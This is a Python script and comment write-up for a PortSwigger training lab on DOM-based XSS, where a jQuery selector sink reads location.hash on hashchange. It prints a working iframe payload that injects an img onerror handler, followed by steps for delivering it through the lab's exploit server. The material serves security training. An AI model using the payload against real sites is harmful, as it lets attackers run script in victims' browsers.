# Lab 06 — DOM XSS in jQuery selector sink using hashchange event
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
#
# Vulnerability: Homepage — jQuery $() reads location.hash on hashchange events
# Aim:           Deliver an exploit via exploit server that calls print()
#
# Technique:
#   The page listens for hashchange and passes location.hash into jQuery $():
#     $(window).on('hashchange', function() {
#         var post = $('section.blog-list h2:contains(' + decodeURIComponent(hash) + ')');
#         if (post) post.get(0).scrollIntoView();
#     });
#
#   jQuery $() can parse HTML strings as DOM elements — injecting an img tag
#   causes onerror to fire when the src fails to load.
#
#   The hash fragment (#) is NEVER sent to the server — purely client-side.
#   We must deliver via an iframe on the exploit server.
#   The iframe triggers the hashchange event after page load.
#
#   Exploit server iframe:
#     <iframe src="TARGET/#" onload="this.src+='<img src=x onerror=print()>'">
#
# ⚠  This lab cannot be automated end-to-end with requests.
#    This script prints the exploit payload and delivery instructions.
#
# Usage: python xss_lab06.py <url>

import sys
import urllib3
from xss_utils import banner, section, print_step, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 06 — DOM XSS: jQuery SELECTOR SINK / location.hash SOURCE")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab06.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    exploit = f'<iframe src="{url}/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>'

    print("  ℹ  location.hash is never sent to the server — delivery requires")
    print("     an iframe that modifies the hash AFTER the page loads.\n")

    print_box("EXPLOIT SERVER BODY — paste this into the Body field", exploit)

    print_step("Go to the exploit server")
    print_step("Paste the iframe above into the Body field")
    print_step("Click 'Store', then 'Deliver exploit to victim'")
    print()
    print("  ℹ  The iframe loads the target page, then appends the payload to #.")
    print("     The hashchange event fires → jQuery parses the img tag → onerror executes.")
